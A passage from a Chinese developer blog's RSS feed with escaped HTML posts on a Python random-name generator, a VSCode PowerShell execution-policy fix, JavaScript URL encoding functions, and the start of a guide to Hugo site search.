        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;家&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;致&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;树&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;炎&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;德&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;行&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;时&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;泰&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;盛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;雄&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;琛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;钧&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;冠&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;策&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;腾&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;楠&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;榕&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;风&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;航&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;弘&amp;#39;&lt;/span&gt;,
    ]
    number &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(second_name_list) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; second_name_list[number]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;二如何随机生成两字或三字的名字&#34;&gt;二.如何随机生成两字或三字的名字&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;second_name&lt;/span&gt;():  &lt;span style=&#34;color:#75715e&#34;&gt;# 随机取名字典&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;........................&lt;/span&gt;


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;first_name&lt;/span&gt;():  &lt;span style=&#34;color:#75715e&#34;&gt;# 随机取姓氏字典&lt;/span&gt;
    first_name_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;赵&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;钱&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;孙&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;李&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;周&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;吴&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;郑&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;王&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;冯&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;陈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;褚&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;卫&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;蒋&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;沈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;韩&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;杨&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;朱&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;秦&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;尤&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;许&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;何&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;吕&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;施&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;张&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;孔&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;曹&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;严&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;华&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;金&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;魏&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;陶&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;姜&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;戚&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;谢&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;邹&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;喻&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;柏&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;水&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;窦&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;章&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;云&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;苏&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;潘&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;葛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;奚&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;范&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;彭&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;郎&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;鲁&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;韦&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;昌&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;马&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;苗&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;凤&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;花&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;方&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;俞&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;任&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;袁&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;柳&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;酆&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;鲍&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;史&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;唐&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;费&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;廉&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;岑&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;薛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;雷&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;贺&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;倪&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;汤&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;滕&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;殷&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;罗&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;毕&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;郝&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;邬&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;安&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;常&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;乐&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;于&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;时&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;傅&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;皮&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;卞&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;齐&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;康&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;伍&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;余&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;元&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;卜&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;顾&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;孟&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;平&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;黄&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;和&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;穆&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;萧&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;尹&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;姚&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;邵&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;堪&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;汪&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;祁&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;毛&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;禹&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;狄&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;米&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;贝&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;明&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;臧&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;计&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;伏&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;成&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;戴&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;谈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;宋&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;茅&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;庞&amp;#39;&lt;/span&gt;,
        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;熊&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;纪&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;舒&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;屈&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;项&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;祝&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;董&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;梁&amp;#39;&lt;/span&gt;]
    number &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, len(first_name_list) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; first_name_list[number]


&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;create_name&lt;/span&gt;():
    number &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
    name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(number):
        name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; name &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; second_name()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; first_name()&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;name
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>VSCode—系统报错禁止运行脚本</title>
        <link>https://ac-lm.github.io/posts/ide/vscode%E7%B3%BB%E7%BB%9F%E6%8A%A5%E9%94%99%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/ide/vscode%E7%B3%BB%E7%BB%9F%E6%8A%A5%E9%94%99%E7%A6%81%E6%AD%A2%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC/</guid>
        <description>&lt;h2 id=&#34;错误描述&#34;&gt;错误描述&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;node_modules/.bin/babel : 无法加载文件 D:\node\node_project\es6\node_modules\.bin\babel.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.co m/fwlink/?LinkID=135170 中的 about_Execution_Policies&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;配置解决&#34;&gt;配置解决&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;以管理员身份运行 VSCode&lt;/li&gt;
&lt;li&gt;执行：get-ExecutionPolicy，此时显示 Restricted，表示状态是禁止的&lt;/li&gt;
&lt;li&gt;执行：set-ExecutionPolicy RemoteSigned&lt;/li&gt;
&lt;li&gt;再执行 get-ExecutionPolicy，显示 RemoteSigned，表示状态启用&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Web开发—Url 编解码</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91url-%E7%BC%96%E8%A7%A3%E7%A0%81/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91url-%E7%BC%96%E8%A7%A3%E7%A0%81/</guid>
        <description>&lt;h2 id=&#34;1escape&#34;&gt;1.escape()&lt;/h2&gt;
&lt;p&gt;escape() 不能直接用于 URL 编码，它的作用是返回一个字符的 Unicode 编码值。比如&amp;quot;春节&amp;quot;的返回结果是 %u6625%u8282 ，escape() 不对&lt;code&gt;+&lt;/code&gt;进行编码，其主要用于汉字编码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;escape&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;春节+国庆&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// %u6625%u8282+%u56FD%u5E86
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;escape&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;春节=+=国庆&amp;#34;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// %u6625%u8282%3D+%3D%u56FD%u5E86
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;unescape&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;%u6625%u8282%3D+%3D%u56FD%u5E86&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// 春节=+=国庆
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2encodeuri&#34;&gt;2.encodeURI()&lt;/h2&gt;
&lt;p&gt;encodeURI() 是用来对 URL 编码的函数。函数会编码整个 URL 地址，但对特殊含义的符号 &lt;code&gt;; / ? : @ &amp;amp; = + $ , #&lt;/code&gt; 不进行编码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(encodeURI(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://baidu.com?hello=您好&amp;amp;word=文档&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// http://baidu.com?hello=%E6%82%A8%E5%A5%BD&amp;amp;word=%E6%96%87%E6%A1%A3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(decodeURI(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://baidu.com?hello=%E6%82%A8%E5%A5%BD&amp;amp;word=%E6%96%87%E6%A1%A3&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// http://baidu.com?hello=您好&amp;amp;word=文档
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3encodeuricomponent&#34;&gt;3.encodeURIComponent()&lt;/h2&gt;
&lt;p&gt;encodeURIComponent() 能编码如&lt;code&gt;; / ? : @ &amp;amp; = + $ , #&lt;/code&gt;这些特殊字符&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(encodeURIComponent(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http://baidu.com?hello=您好&amp;amp;word=文档&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// http%3A%2F%2Fbaidu.com%3Fhello%3D%E6%82%A8%E5%A5%BD%26word%3D%E6%96%87%E6%A1%A3
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(decodeURIComponent(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;http%3A%2F%2Fbaidu.com%3Fhello%3D%E6%82%A8%E5%A5%BD%26word%3D%E6%96%87%E6%A1%A3&amp;#39;&lt;/span&gt;))
&lt;span style=&#34;color:#75715e&#34;&gt;// http://baidu.com?hello=您好&amp;amp;word=文档
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—如何给 hugo 博客添加搜索功能</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E7%BB%99-hugo-%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E6%90%9C%E7%B4%A2%E5%8A%9F%E8%83%BD/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://studygolang.com/articles/27141?fr=sidebar&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;给Hugo站点添加搜索功能 - Go语言中文网&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1利用自带的-indexxml-文件实现&#34;&gt;1.利用自带的 index.xml 文件实现&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;利用 hugo 生成的 index.xml 文件进行内容搜索。路径 public &amp;gt; index.xml。文件包含博客所有文章的标题，链接和概要。&lt;/li&gt;
&lt;li&gt;JavaScript 实现如下&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;pathname&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/404.html&amp;#39;&lt;/span&gt;){
	   &lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;search&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;substr&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
	   &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;query&lt;/span&gt;){
